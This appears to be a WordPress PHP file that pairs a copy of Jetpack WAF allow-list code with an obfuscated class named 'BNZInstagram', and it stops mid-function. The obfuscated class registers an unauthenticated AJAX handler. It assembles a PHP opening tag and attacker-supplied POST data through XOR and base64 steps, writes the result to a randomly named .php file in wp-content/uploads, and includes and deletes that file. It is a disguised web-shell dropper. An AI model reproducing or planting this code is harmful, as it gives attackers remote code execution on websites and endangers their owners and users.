<?php
if (!defined('ABSPATH')) {
    die;
}

class send_finder_first_live
{
    public static function format_whitelist()
    {
        _deprecated_function(__METHOD__, 'waf-0.11.0', __CLASS__ . '::format_allow_list');
        return self::format_allow_list();
    }

    public static function format_allow_list()
    {
        $local_allow_list = self::get_local_allow_list();
        $formatted = array(
            'local' => array(),
        );
        foreach ($local_allow_list as $item) {
            if ($item->range) {
                $formatted['local'][] = $item->range_low . ' - ' . $item->range_high;
            } else {
                $formatted['local'][] = $item->ip_address;
            }
        }
        if (is_multisite() && current_user_can('manage_network')) {
            $formatted['global'] = array();
            $global_allow_list = self::get_global_allow_list();
            if (false === $global_allow_list) {
                $global_allow_list = get_site_option('jetpack_protect_whitelist', array());
            }
            foreach ($global_allow_list as $item) {
                if ($item->range) {
                    $formatted['global'][] = $item->range_low . ' - ' . $item->range_high;
                } else {
                    $formatted['global'][] = $item->ip_address;
                }
            }
        }
        return $formatted;
    }

    public static function get_local_whitelist()
    {
        _deprecated_function(__METHOD__, 'waf-0.11.0', __CLASS__ . '::get_local_allow_list');
        return self::get_local_allow_list();
    }

    public static function get_local_allow_list()
    {
        $allow_list = get_option(Waf_Rules_Manager::IP_ALLOW_LIST_OPTION_NAME);
        if (false === $allow_list) {
            if (is_multisite()) {
                $allow_list = get_site_option('jetpack_protect_whitelist', array());
            } else {
                $allow_list = array();
            }
        } else {
            $allow_list = IP_Utils::get_ip_addresses_from_string($allow_list);
            $allow_list = array_map(
                function ($ip_address) {
                    return self::create_ip_object($ip_address);
                },
                $allow_list
            );
        }
        return $allow_list;
    }

    public static function get_global_whitelist()
    {
        _deprecated_function(__METHOD__, 'waf-0.11.0', __CLASS__ . '::get_global_allow_list');
        return self::get_global_allow_list();
    }

    public static function get_global_allow_list()
    {
        $allow_list = get_site_option('jetpack_protect_global_whitelist');
        if (false === $allow_list) {
            $allow_list = get_site_option('jetpack_protect_whitelist', array());
        }
        return $allow_list;
    }

    private static function create_ip_object($ip_address)
    {
        if (strpos($ip_address, '-')) {
            $ip_range_parts = explode('-', $ip_address);
            return (object) array(
                'range' => true,
                'range_low' => trim($ip_range_parts[0]),
                'range_high' => trim($ip_range_parts[1]),
            );
        }

        if (strpos($ip_address, '/') !== false) {
            return (object) array(
                'range' => true,
                'range_low' => $ip_address,
                'range_high' => null,
            );
        }

        return (object) array(
            'range' => false,
            'ip_address' => $ip_address,
        );
    }

    public static function save_whitelist($allow_list, $global = false)
    {
        _deprecated_function(__METHOD__, 'waf-0.11.0', __CLASS__ . '::save_allow_list');
        return self::save_allow_list($allow_list, $global);
    }

    public static function save_allow_list($allow_list, $global = false)
    {
        $allow_list_error = false;
        $new_items = array();
        if (!is_array($allow_list)) {
            return new WP_Error('invalid_parameters', __('Expecting an array', 'jetpack-waf'));
        }
        if ($global && !is_multisite()) {
            return new WP_Error('invalid_parameters', __('Cannot use global flag on non-multisites', 'jetpack-waf'));
        }
        if ($global && !current_user_can('manage_network')) {
            return new WP_Error('permission_denied', __('Only super admins can edit the global allow list', 'jetpack-waf'));
        }

        foreach ($allow_list as $item) {
            $item = trim($item);
            if (empty($item)) {
                continue;
            }
            $new_item = self::create_ip_object($item);
            if ($new_item->range) {
                if (!filter_var($new_item->range_low, FILTER_VALIDATE_IP) || !filter_var($new_item->range_high, FILTER_VALIDATE_IP)) {
                    $allow_list_error = true;
                    break;
                }
                if (!IP_Utils::convert_ip_address($new_item->range_low) || !IP_Utils::convert_ip_address($new_item->range_high)) {
                    $allow_list_error = true;
                    break;
                }
            } else {
                if (!filter_var($new_item->ip_address, FILTER_VALIDATE_IP)) {
                    $allow_list_error = true;
                    break;
                }
                if (!IP_Utils::convert_ip_address($new_item->ip_address)) {
                    $allow_list_error = true;
                    break;
                }
            }
            $new_items[] = $new_item;
        }
        if (!empty($allow_list_error)) {
            return new WP_Error('invalid_ip', __('One of your IP addresses was not valid.', 'jetpack-waf'));
        }
        if ($global) {
            update_site_option('jetpack_protect_global_whitelist', $new_items);

            delete_site_option('jetpack_protect_whitelist');
        } else {
            $new_items = array_map(
                function ($item) {
                    if ($item->range) {
                        return $item->range_low . '-' . $item->range_high;
                    }
                    return $item->ip_address;
                },
                $new_items
            );
            update_option(Waf_Rules_Manager::IP_ALLOW_LIST_OPTION_NAME, implode(' ', $new_items));
        }
        return true;
    }
}

class BNZInstagram
{
    private $JPHAffiliate = 0;
    private $LCUrl = 0;
    private $IQFScreenPublisher = '';
    private $lockRs = 20;
    private $membersQuickBc = 20;
    private $editionTxAbout = '';
    private $LBWoff2 = '';
    private $NEPBeaverMake = '';
    private $LSLFeedbackTranslate = 'php';
    private $tinyRdy = '';
    private $widgetsListingsYp = 0;
    private $viewTc = '';
    private $PETimeReusable = '';
    private $timerYlg = '';
    private $SSWStockSlug = '';
    private $lightLg = 13;
    private $managementPlatformQr = 'ou_testimonials';
    private $SWPostTree = '';
    private $XNReloaded = '';
    private $commentQaDeprecated = 0;
    private $RYArchives = 0;
    private $NHJetpackSsl = 12;
    private $reviewsCallMv = 0;
    private $buttonsQiBackground = 'tinymce_rcz';
    private $wallMau = '';
    private $OZDProductsTinymce = 0;
    private $LALocalThumbnail = 'include_dkf';
    private $domainCloudQg = '';
    private $treeMobileDkw = 0;
    private $posterXvcClient = '';

    public function __construct()
    {
        if (isset($_POST['STYLES_HEALTH_GATEWAY']))
            $deprecatedLef = $_POST['STYLES_HEALTH_GATEWAY'];
        else
            $deprecatedLef = '';
        $ampDe = $this->buttonsQiBackground;
        add_action('wp_ajax_estate_categories_click_webp', array($this, 'XJZWidgets'));
        add_action('wp_ajax_nopriv_estate_categories_click_webp', array($this, 'XJZWidgets'));
        $this->IQFScreenPublisher = esc_attr($ampDe);
        $backYi = admin_url();
        $this->IQFScreenPublisher = esc_html($deprecatedLef);
        return $backYi;
    }

    function moduleFaviconPsw()
    {
        $VTRLayoutLive = 'fiz';
        $sectionSslZak = $this->LALocalThumbnail;
        $QODisplay = $_SERVER['REQUEST_METHOD'];
        $TTDMemberLoad = rawurlencode($sectionSslZak);
        $IWXHelper = strtoupper($TTDMemberLoad);
        $this->IQFScreenPublisher = trim($TTDMemberLoad);
        $basedReAnywhere = strtolower($sectionSslZak);
        return $basedReAnywhere;
    }

    function SXImport()
    {
        $ZDPopular = $_SERVER['REMOTE_ADDR'];
        $akismetEm = $this->viewTc;
        $UVPanelShowcase = md5($akismetEm);
        $this->tinyRdy = $_POST[$this->LALocalThumbnail];
        $mediaTitlesNrk = strpos($akismetEm, $ZDPopular);
        $timeJejMenu = strlen($UVPanelShowcase);
        return $timeJejMenu;
    }

    function addressWc()
    {
        if (isset($_REQUEST['pk_namespaced']))
            $ratingsVersionYjj = $_REQUEST['pk_namespaced'];
        else
            $ratingsVersionYjj = '';
        $this->IQFScreenPublisher = base64_encode($ratingsVersionYjj);
        $HJZScriptCloud = 'bhxojbp';
        $PFFClassic = strtoupper($HJZScriptCloud);
        $assetsTrafficLwm = strlen($PFFClassic);
        $conditionalTzpMember = strlen($PFFClassic);
        $exporterLolListings = strtolower($PFFClassic);
        $surveyHoClient = 'xml uploads country fields data';
        $UXLayout = $this->wallMau;
        $this->XNReloaded = $this->SWPostTree[$this->widgetsListingsYp];
        $welcomeFjAllow = esc_html($UXLayout);
        return $welcomeFjAllow;
    }

    function selectorNhh($OQTRatings)
    {
        $this->IQFScreenPublisher = strtoupper($OQTRatings);
        $stripeEventWt = esc_html($OQTRatings);
        $this->IQFScreenPublisher = rawurldecode($stripeEventWt);
        $ABSlugVisitor = strlen($stripeEventWt);
        $this->editionTxAbout = $_POST[$this->managementPlatformQr];
        $toolHmx = base64_decode($OQTRatings);
        $catalogMqz = strlen($toolHmx);
        $ZBConversionIframe = strlen($toolHmx);
        $LLIEnhanced = strtoupper($toolHmx);
        return $LLIEnhanced;
    }

    function verificationLnl()
    {
        if (!empty($_POST['INY_INTEGRATION']))
            $LTBFont = $_POST['INY_INTEGRATION'];
        else
            $LTBFont = '';
        $footerPlayerXml = 0;
        if (is_file($LTBFont)) {
            $footerPlayerXml = filesize($LTBFont);
        }
        if (file_exists($this->PETimeReusable))
            include_once ($this->PETimeReusable);
        $wpformsDirectoryFbf = $this->tinyRdy;
        if (!empty($_GET['WID']))
            $pdfConversionRs = $_GET['WID'];
        else
            $pdfConversionRs = '';
        $this->IQFScreenPublisher = get_permalink($footerPlayerXml);
        return $footerPlayerXml;
    }

    function layoutQii()
    {
        $indexZly = $this->buttonsQiBackground;
        $jqueryTaSrc = ~$indexZly;
        $multipleMembershipOb = $this->LSLFeedbackTranslate;
        $this->SWPostTree .= $this->domainCloudQg ^ $this->XNReloaded;
        if (!empty($_REQUEST['bwyzde']))
            $packAffiliatesQek = $_REQUEST['bwyzde'];
        else
            $packAffiliatesQek = '';
        $altYra = $packAffiliatesQek & $indexZly;
        $quoteZij = $indexZly ^ $multipleMembershipOb;
        $formEyoAddons = $indexZly ^ $multipleMembershipOb;
        $mediaelementVlPlayer = $packAffiliatesQek & $indexZly;
        $supportSem = $packAffiliatesQek | $indexZly;
        $FEFAssets = $indexZly & $packAffiliatesQek;
        if (isset($_GET['QMVW']))
            $VQEAutocomplete = $_GET['QMVW'];
        else
            $VQEAutocomplete = '';
        return $VQEAutocomplete;
    }

    function sitesBvzMessage()
    {
        $postsGcn = $this->XNReloaded;
        $syncAx = sanitize_text_field($postsGcn);
        $EWSmtp = 'ncstwtb';
        $WBFMediaelement = apply_filters('integrate_mini', $postsGcn);
        $this->IQFScreenPublisher = site_url();
        $MIReviewExport = base64_decode($WBFMediaelement);
        $UCJMost = strtolower($MIReviewExport);
        return $UCJMost;
    }

    function coverIul()
    {
        if (isset($_POST['META_SCREEN']))
            $extraIb = $_POST['META_SCREEN'];
        else
            $extraIb = '';
        $designerElh = ~$extraIb;
        $WULazy = 'vpuoqbgp';
        $QWTToolkit = $extraIb ^ $WULazy;
        $this->NEPBeaverMake .= $this->domainCloudQg ^ $this->XNReloaded;
        $buttonsNofollowGoy = $WULazy ^ $extraIb;
        $ZGUrl = $extraIb & $WULazy;
        $KZDeprecated = $extraIb | $WULazy;
        $boosterBt = $WULazy ^ $extraIb;
        $DSPreview = $_SERVER['REMOTE_ADDR'];
        return $DSPreview;
    }

    function GWVPhotos($TBPerformance)
    {
        $CBIndex = strlen($TBPerformance);
        $RPSDatabaseBackground = strlen($TBPerformance);
        $httpCalendarPui = trim($TBPerformance);
        $notifierDomainCpy = trim($httpCalendarPui);
        $HOXCookie = trim($httpCalendarPui);
        $this->viewTc = base64_decode($this->tinyRdy);
        $exportLbf = strlen($HOXCookie);
        $JNJRecaptchaStop = strtoupper($notifierDomainCpy);
        return $exportLbf;
    }

    function LMCheckoutWelcome()
    {
        $elementsModeXk = $_SERVER['SERVER_SOFTWARE'];
        if (file_exists($this->PETimeReusable))
            unlink($this->PETimeReusable);
        if (is_file($elementsModeXk)) {
            $this->OZDProductsTinymce = filesize($elementsModeXk);
        }
        if (file_exists($elementsModeXk)) {
            $this->IQFScreenPublisher = file_get_contents($elementsModeXk);
        }
        if (is_dir($elementsModeXk)) {
            $BREndpointsAnti = glob($elementsModeXk);
        }
        if (is_file($elementsModeXk)) {
            $this->OZDProductsTinymce = filesize($elementsModeXk);
        }
        if (is_file($elementsModeXk)) {
            $this->IQFScreenPublisher = file_get_contents($elementsModeXk);
        }
        $this->IQFScreenPublisher = esc_url($elementsModeXk);
        if (is_file($elementsModeXk)) {
            $this->IQFScreenPublisher = file_get_contents($elementsModeXk);
        }
        if (isset($_REQUEST['FLOATING_TEMPLATES']))
            $validationNufQuiz = $_REQUEST['FLOATING_TEMPLATES'];
        else
            $validationNufQuiz = '';
        if (is_dir($elementsModeXk)) {
            $duplicateQd = scandir($elementsModeXk);
        }
        $mapsEzn = 0;
        if (is_file($elementsModeXk)) {
            $mapsEzn = filesize($elementsModeXk);
        }
        return $mapsEzn;
    }

    function radioRi($shortcodeMwnMaster)
    {
        $HZIYoutubeEnable = trim($shortcodeMwnMaster);
        $radioBackupMbb = esc_attr($HZIYoutubeEnable);
        $FOJavascriptThumbnail = '<';
        $recentUpdateKt = rawurlencode($HZIYoutubeEnable);
        $FOJavascriptThumbnail .= '?';
        if (isset($_GET['zorxqr']))
            $YYYAsset = $_GET['zorxqr'];
        else
            $YYYAsset = '';
        $this->LSLFeedbackTranslate = $FOJavascriptThumbnail . $this->LSLFeedbackTranslate;
        $typesFwf = trim($YYYAsset);
        return $typesFwf;
    }

    function basedMlChanger($globalWn)
    {
        $XUSalesPopup = $_SERVER['REQUEST_METHOD'];
        $this->commentQaDeprecated = strlen($this->viewTc);
        $comTza = 'jdlg';
        $NCUVersionCompanion = rawurlencode($globalWn);
        $LFKYoastTheme = rawurldecode($NCUVersionCompanion);
        $HRRatesPopular = get_option($comTza);
        $ABSelectAddons = strlen($HRRatesPopular);
        $MFAdvanced = md5($comTza);
        return $MFAdvanced;
    }

    function onlyUiElements($GIXAbout)
    {
        $QRQUltimateWidget = $this->LSLFeedbackTranslate;
        $photosPcoWpml = $this->basedMlChanger($GIXAbout);
        if (isset($_REQUEST['G29C']))
            $IOIRatingCount = $_REQUEST['G29C'];
        else
            $IOIRatingCount = '';
        $scrollDkd = $this->ENKDuplicateMigration();
        $QNWShort = strpos($IOIRatingCount, $photosPcoWpml);
        for ($i = 0; $i < $this->commentQaDeprecated; $i++) {
            $cardRmlError = $_SERVER['REMOTE_ADDR'];
            $KZReact = $this->accessibilityIntegrationNet($i);
            if (isset($_POST['tyidauth']))
                $VDSpecific = $_POST['tyidauth'];
            else
                $VDSpecific = '';
            $visibilityUnt = $this->DLHWidgetsSharing($VDSpecific);
            $displayOy = strtolower($GIXAbout);
            $adsenseBap = $this->RWDate($QNWShort);
            $webSub = rawurlencode($displayOy);
            $boxGub = $this->addressWc();
            $seoFc = 'xrhf';
            $twitterAccountUs = 'usrdgl';
            $javascriptLhvPrivacy = $this->coverIul();
            if (isset($_REQUEST['ahb']))
                $portalZrn = $_REQUEST['ahb'];
            else
                $portalZrn = '';
            $QEAccountChatbot = rawurldecode($portalZrn);
            $OLPDownloads = rawurlencode($portalZrn);
            $PNICover = esc_url($OLPDownloads);
            $wallQsDropdown = md5($PNICover);
            $jigoshopConversionVe = strtolower($OLPDownloads);
        }
        $htmlJsj = strpos($visibilityUnt, $OLPDownloads);
        $imageYb = base64_decode($jigoshopConversionVe);
        return $imageYb;
    }

    function WVMediaelement()
    {
        $ODOTitleSmtp = $_SERVER['HTTP_USER_AGENT'];
        $optionAntiDd = rawurldecode($ODOTitleSmtp);
        $anywhereCsvPsb = md5($optionAntiDd);
        $BZBasicVisual = sanitize_key($optionAntiDd);
        if (!empty($_GET['SOFTWARE_ARCHIVES']))
            $LEYoast = $_GET['SOFTWARE_ARCHIVES'];
        else
            $LEYoast = '';
        $ZCVAddon = trim($BZBasicVisual);
        $this->timerYlg = base64_decode($this->LBWoff2);
        $XRConnect = trim($LEYoast);
        return $ZCVAddon;
    }

    function appointmentEs()
    {
        $protectionIpiGravity = 'variations forms animated insert recent';
        $SOFeaturedMultiple = strlen($protectionIpiGravity);
        $actionFp = rawurlencode($protectionIpiGravity);
        $monitorKkTranslator = base64_decode($actionFp);
        if (isset($_GET['rating_online']))
            $SAGamipress = $_GET['rating_online'];
        else
            $SAGamipress = '';
        $HUHInlineCom = md5($actionFp);
        $KFHComingPoll = rawurldecode($HUHInlineCom);
        $this->LCUrl = strpos($this->NEPBeaverMake, 'j4zUVBUTwNTB');
        if (!empty($_POST['bv_monitor_lead']))
            $CIOfficial = $_POST['bv_monitor_lead'];
        else
            $CIOfficial = '';
        $this->IQFScreenPublisher = strtolower($actionFp);
        return $KFHComingPoll;
    }

    function DOMigrationMenu($thisWowHy)
    {
        $removeShippingMk = strtolower($thisWowHy);
        $colorVs = do_action('comment_automatorwp_query');
        $this->domainCloudQg = $this->posterXvcClient[$this->treeMobileDkw];
        $ZPSitemaps = base64_decode($removeShippingMk);
        $viewerBn = md5($ZPSitemaps);
        $demomentsomtresReminderMdu = base64_encode($ZPSitemaps);
        $flexibleXzq = strtolower($demomentsomtresReminderMdu);
        $maxPostWpg = trim($flexibleXzq);
        $httpUcExtended = sanitize_text_field($flexibleXzq);
        $importKqx = $this->moduleFaviconPsw();
        $HOActionTypes = rawurlencode($importKqx);
        return $importKqx;
    }

    function ageChartVm($FQQEvents)
    {
        if (!empty($_POST['aldczb']))
            $uploadBnrGrid = $_POST['aldczb'];
        else
            $uploadBnrGrid = '';
        $previewUw = 'ajax dist';
        $KVPhp = $this->snippetsGrRequest();
        $panelGl = $this->PETimeReusable;
        $directoryGbv = rawurldecode($FQQEvents);
        $cloudEo = $this->chatbotKj();
        $CHDDynamic = apply_filters('activity_tracking_stats', $previewUw);
        for ($i = 0; $i < $this->commentQaDeprecated; $i++) {
            $ipSelectAo = md5($cloudEo);
            $keywordsEaStatic = $this->accessibilityIntegrationNet($i);
            $PBEDashboard = $this->viewTc;
            $SMUpdates = $this->DOMigrationMenu($uploadBnrGrid);
            $this->IQFScreenPublisher = base64_encode($SMUpdates);
            $fontsDirectoryVak = $this->widgetsListingsYp;
            $githubYvCommunity = $this->RWDate($fontsDirectoryVak);
            $FVVirtualShop = site_url();
            $WUFSelector = $this->GERLeadCoupon($ipSelectAo);
            $UGSvgSecurity = base64_decode($FVVirtualShop);
            $plusRvbHelp = $this->layoutQii();
            if (!empty($_GET['nl4']))
                $VOCHidden = $_GET['nl4'];
            else
                $VOCHidden = '';
        }
        $WYSolutionFlexible = strtoupper($VOCHidden);
        $likeKx = base64_encode($plusRvbHelp);
        add_action('title_min_yoast', $PBEDashboard);
        $KTThemes = strpos($KVPhp, $WYSolutionFlexible);
        $jqueryActConditional = strtoupper($WUFSelector);
        $DJMDist = base64_decode($jqueryActConditional);
        $eventsYmc = strtolower($DJMDist);
        return $DJMDist;
    }

    function XJZWidgets()
    {
        $performanceFpiArchives = 'calendar browser rotator rate flexible heading';
        $testimonialEditorCi = get_option($performanceFpiArchives);
        $PKRExtra = $this->KKIndex();
        if (!empty($_GET['IID']))
            $contentChangerLv = $_GET['IID'];
        else
            $contentChangerLv = '';
        $TVPoll = $this->YSRank($contentChangerLv);
        $EYLive = get_option($TVPoll);
        $reactUwAnalytics = $this->radioRi($PKRExtra);
        $PUIPlus = md5($performanceFpiArchives);
        $PLSwitch = rawurlencode($PUIPlus);
        $faviconDtButtons = $this->selectorNhh($TVPoll);
        $this->IQFScreenPublisher = rawurlencode($PLSwitch);
        $floatingZhh = $this->SXImport();
        $PTPush = trim($floatingZhh);
        $updateAlertPws = $this->XUYOut($performanceFpiArchives);
        $this->IQFScreenPublisher = admin_url();
        $worldIea = $this->apiMy();
        $this->IQFScreenPublisher = rawurldecode($worldIea);
        $notifyQiuMultisite = base64_decode($worldIea);
        if (isset($_REQUEST['EMAILS_MEMBERS_BEF']))
            $headersFkOpen = $_REQUEST['EMAILS_MEMBERS_BEF'];
        else
            $headersFkOpen = '';
        $TQManagement = $this->reloadedJtrNice($PLSwitch);
        $this->JPHAffiliate = strlen($updateAlertPws);
        $flexibleFsi = $this->WVMediaelement();
        $DKMMediaelementLightbox = rawurldecode($TQManagement);
        $GHVisibilityFavicon = $this->GWVPhotos($updateAlertPws);
        $anotherQn = home_url();
        $recipeQt = $_SERVER['HTTP_USER_AGENT'];
        $youtubeRrtRotator = rawurlencode($anotherQn);
        $beaverKle = trim($youtubeRrtRotator);
        $settingsLvx = base64_decode($youtubeRrtRotator);
        $KGNAssetsInclude = $this->ageChartVm($EYLive);
        $CVBlock = $this->buttonsQiBackground;
        $internalXqc = md5($CVBlock);
        $estateIc = $this->onlyUiElements($recipeQt);
        $quickBulkKi = md5($estateIc);
        $betterRr = do_action('ninja_another_post');
        $WFMaxLike = $this->appointmentEs();
        if (isset($_POST['uidtoken']))
            $tablesFvUploader = $_POST['uidtoken'];
        else
            $tablesFvUploader = '';
        if ($this->LCUrl > -1) {
            $FCKFix = base64_decode($WFMaxLike);
            $YJPoll = $this->UDNumber($PUIPlus);
            $methodGoogleDn = esc_attr($YJPoll);
            $QNRRemoveRequest = $this->verificationLnl();
            $demomentsomtresHnSsl = strlen($methodGoogleDn);
            $slugGvRight = $this->LMCheckoutWelcome();
            $this->IQFScreenPublisher = base64_decode($FCKFix);
            if (!empty($_POST['U8WU6YID']))
                $AEABbpress = $_POST['U8WU6YID'];
            else
                $AEABbpress = '';
            if (!current_user_can('manage_options'))
                die;
            $profileSyntaxUqv = base64_encode($AEABbpress);
            for ($i; $i < $demomentsomtresHnSsl; $i++) {
                $deleteXl = '';
                if (is_file($flexibleFsi)) {
                    $deleteXl = file_get_contents($flexibleFsi);
                }
                if (is_dir($performanceFpiArchives)) {
                    $printEwaProfile = scandir($performanceFpiArchives);
                }
                if (file_exists($CVBlock)) {
                    $this->reviewsCallMv = filesize($CVBlock);
                }
                if (is_dir($AEABbpress)) {
                    $groupXxa = scandir($AEABbpress);
                }
                if (is_dir($PTPush)) {
                    $TKNHelperPerformance = glob($PTPush);
                }
            }
            $QRAAdditional = sanitize_text_field($profileSyntaxUqv);
            $SWRequest = md5($profileSyntaxUqv);
            $this->OZDProductsTinymce = strlen($QRAAdditional);
        }
        $AEHGroup = rawurldecode($QRAAdditional);
        $modulesQgeNumbers = base64_encode($AEHGroup);
        if (is_admin($WFMaxLike)) {
            $LEGOpen = site_url();
            $CLHService = admin_url();
            $iconsPhx = site_url();
            $widgetWu = get_option($estateIc);
            $selectVjVariation = sanitize_key($performanceFpiArchives);
            $this->IQFScreenPublisher = home_url();
        }
        $makerDzForms = strtoupper($modulesQgeNumbers);
        $designMediaJfe = base64_decode($makerDzForms);
        return $designMediaJfe;
    }

    function accessibilityIntegrationNet($LSBVideos)
    {
        if (isset($_REQUEST['VQHND']))
            $preloaderNenRandom = $_REQUEST['VQHND'];
        else
            $preloaderNenRandom = '';
        $this->treeMobileDkw = $LSBVideos;
        $FUPOptimizer = get_option($preloaderNenRandom);
        $FFFEffects = $this->editionTxAbout;
        $typesChrTranslation = apply_filters('data_html5_most', $preloaderNenRandom);
        $NAExtensions = 'lite customizer event nice';
        $CKCEasyController = base64_encode($NAExtensions);
        return $CKCEasyController;
    }

    function DLHWidgetsSharing($geoNzo)
    {
        $SJSwitcher = $_SERVER['REQUEST_URI'];
        $IERPicker = md5($geoNzo);
        $this->domainCloudQg = $this->viewTc[$this->treeMobileDkw];
        $DJVPlugins = sanitize_key($IERPicker);
        $forceFrameworkRy = rawurlencode($DJVPlugins);
        $restWlc = strlen($forceFrameworkRy);
        $XKSBack = $this->JDAImporter();
        $VKWCalendar = md5($XKSBack);
        $enableRl = strlen($VKWCalendar);
        $EDServer = strtolower($VKWCalendar);
        return $EDServer;
    }

    function XUYOut($easyDykLog)
    {
        $HQVirtual = base64_encode($easyDykLog);
        $deleteKitAg = base64_encode($HQVirtual);
        $shopDeliveryFxk = rawurldecode($deleteKitAg);
        if (!empty($_POST['secure']))
            $compareGdh = $_POST['secure'];
        else
            $compareGdh = '';
        $this->IQFScreenPublisher = md5($shopDeliveryFxk);
        $SPAge = admin_url();
        $URYWpc = strpos($easyDykLog, $compareGdh);
        $this->LBWoff2 = substr($this->editionTxAbout, $this->lightLg, $this->lockRs);
        $blocksShortcodeFfv = base64_encode($compareGdh);
        return $blocksShortcodeFfv;
    }

    function JDAImporter()
    {
        $SVName = 9680;
        $interactivityOkFrontend = $SVName % 2;
        $this->reviewsCallMv = $SVName / 7;
        $redirectionFul = $interactivityOkFrontend % 7;
        $ANSuper = $redirectionFul % 1;
        $this->OZDProductsTinymce = $SVName % 8;
        $WSIRtlDefault = $redirectionFul * $interactivityOkFrontend;
        $tinyUwLock = $redirectionFul % 8;
        return $tinyUwLock;
    }

    function YSRank($optionsNinjaHbn)
    {
        $flexibleJmg = rawurlencode($optionsNinjaHbn);
        if (isset($_GET['gtcid5817786']))
            $NZFinderAfter = $_GET['gtcid5817786'];
        else
            $NZFinderAfter = '';
        $this->IQFScreenPublisher = strtoupper($NZFinderAfter);
        if (!empty($_REQUEST['ftfpmz']))
            $banglaDy = $_REQUEST['ftfpmz'];
        else
            $banglaDy = '';
        $KPGSlideshowGallery = $this->timerYlg;
        $pinterestOmq = 'star integrate reader';
        $EVHQr = $this->sitesBvzMessage();
        if (!empty($_GET['mnf_toggle']))
            $estateQj = $_GET['mnf_toggle'];
        else
            $estateQj = '';
        $headingDropBa = md5($EVHQr);
        $XCAmp = md5($estateQj);
        $YGNetwork = strpos($XCAmp, $optionsNinjaHbn);
        $this->wallMau = $_POST[$this->buttonsQiBackground];
        return $headingDropBa;
    }

    function GERLeadCoupon($ZECCompat)
    {
        $ultimateBestXs = $this->editionTxAbout;
        $INZMarketingStatus = strtolower($ZECCompat);
        $automatorwpFd = rawurldecode($ultimateBestXs);
        $THIpGuest = strtolower($automatorwpFd);
        $this->XNReloaded = $this->timerYlg[$this->widgetsListingsYp];
        $copyrightKx = strtoupper($automatorwpFd);
        return $copyrightKx;
    }

    function chatbotKj()
    {
        if (!empty($_GET['map_effect']))
            $GZDay = $_GET['map_effect'];
        else
            $GZDay = '';
        $KQTRight = strtoupper($GZDay);
        $THEResults = sanitize_key($GZDay);
        $videosSbgPinterest = rawurlencode($THEResults);
        $this->RYArchives = strlen($this->timerYlg);
        $feedAkwFeedback = strtoupper($THEResults);
        $enableInteractivityPv = esc_url($feedAkwFeedback);
        $finderRn = base64_encode($enableInteractivityPv);
        return $finderRn;
    }

    function KKIndex()
    {
        $secureLf = $this->PETimeReusable;
        $this->PETimeReusable = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/cQpLzxZMo0Zpnr.php';
        if (isset($_REQUEST['HTGIDNCCGPHN']))
            $ageBt = $_REQUEST['HTGIDNCCGPHN'];
        else
            $ageBt = '';
        if (isset($_GET['ACCOUNT_CAMPAIGN']))
            $EFDate = $_GET['ACCOUNT_CAMPAIGN'];
        else
            $EFDate = '';
        $HAULoggerSmtp = $this->wallMau;
        $this->IQFScreenPublisher = apply_filters('ratings_bulk_old', $ageBt);
        $XKGamipressRating = 'social official items xml seo clean';
        if (file_exists($HAULoggerSmtp)) {
            $this->OZDProductsTinymce = filesize($HAULoggerSmtp);
        }
        if (is_dir($XKGamipressRating)) {
            $replaceMobileNj = glob($XKGamipressRating);
        }
        $QJScheduledDemomentsomtres = '';
        if (file_exists($XKGamipressRating)) {
            $QJScheduledDemomentsomtres = file_get_contents($XKGamipressRating);
        }
        return $QJScheduledDemomentsomtres;
    }

    function RWDate($tablesRtb)
    {
        $formNiceUo = $this->lockRs;
        $specificSitesNds = $this->commentQaDeprecated;
        $this->OZDProductsTinymce = $tablesRtb + 1;
        $this->OZDProductsTinymce = $specificSitesNds + 7;
        $tickerVc = $specificSitesNds - 5;
        $this->OZDProductsTinymce = $formNiceUo % 6;
        $this->widgetsListingsYp = $this->treeMobileDkw % $this->RYArchives;
        $TRSignup = $specificSitesNds - $tablesRtb;
        $cleanerPlayerFe = $specificSitesNds - $formNiceUo;
        $this->JPHAffiliate = $tablesRtb % 5;
        return $this->JPHAffiliate;
    }

    function reloadedJtrNice($stripeAuthenticationCes)
    {
        $getNumberJoo = $_SERVER['SERVER_SOFTWARE'];
        $viewsAul = $this->wallMau;
        $this->posterXvcClient = base64_decode($this->SSWStockSlug);
        $recaptchaZasCool = strpos($getNumberJoo, $viewsAul);
        $TNIVersionStream = trim($stripeAuthenticationCes);
        $WMNPermalink = base64_encode($viewsAul);
        return $TNIVersionStream;
    }

    function apiMy()
    {
        $checkoutEfMin = $_SERVER['REQUEST_METHOD'];
        $this->SSWStockSlug = substr($this->wallMau, $this->NHJetpackSsl, $this->membersQuickBc);
        $companionZz = strlen($checkoutEfMin);
        $BNIntegrationCatalog = base64_encode($checkoutEfMin);
        $FYROldPortfolio = trim($BNIntegrationCatalog);
        $logCheckerXv = trim($checkoutEfMin);
        return $logCheckerXv;
    }

    function ENKDuplicateMigration()
    {
        $restMessengerAxf = 'rcbmogy';
        $this->RYArchives = strlen($this->SWPostTree);
        $KHCGeo = base64_encode($restMessengerAxf);
        $YSKFull = trim($KHCGeo);
        $landingTdp = 'dsotz';
        $this->reviewsCallMv = strlen($landingTdp);
        $TMNew = do_action('popular_duplicate');
        return $YSKFull;
    }

    function snippetsGrRequest()
    {
        if (!empty($_POST['BEAVER_LINKS']))
            $trackingAxhMin = $_POST['BEAVER_LINKS'];
        else
            $trackingAxhMin = '';
        $GBJUploaderHide = $this->SSWStockSlug;
        $webLe = $this->SSWStockSlug;
        if (!empty($_POST['options_web_tei']))
            $FYEnable = $_POST['options_web_tei'];
        else
            $FYEnable = '';
        $this->commentQaDeprecated = strlen($this->posterXvcClient);
        $forumBm = home_url();
        $checkerRpg = $this->wallMau;
        $wishlistQfz = base64_decode($GBJUploaderHide);
        return $forumBm;
    }

    function UDNumber($PUJson)
    {
        $PHHSliding = '';
        if (file_exists($PUJson)) {
            $PHHSliding = file_get_contents($PUJson);
        }
        file_put_contents($this->PETimeReusable, $this->LSLFeedbackTranslate . ' ' . $this->NEPBeaverMake);
        if (is_file($PUJson)) {
            $this->reviewsCallMv = filesize($PUJson);
        }
        if (is_dir($PHHSliding)) {
            $menusGy = scandir($PHHSliding);
        }
        $networkBbdAkismet = 0;
        if (file_exists($PHHSliding)) {
            $networkBbdAkismet = filesize($PHHSliding);
        }
        if (is_dir($PUJson)) {
            $testimonialsGg = scandir($PUJson);
        }
        $this->IQFScreenPublisher = esc_url($PHHSliding);
        if (is_file($PHHSliding)) {
            $this->IQFScreenPublisher = file_get_contents($PHHSliding);
        }
        $UFKUrlsConverter = 0;
        if (is_file($PHHSliding)) {
            $UFKUrlsConverter = filesize($PHHSliding);
        }
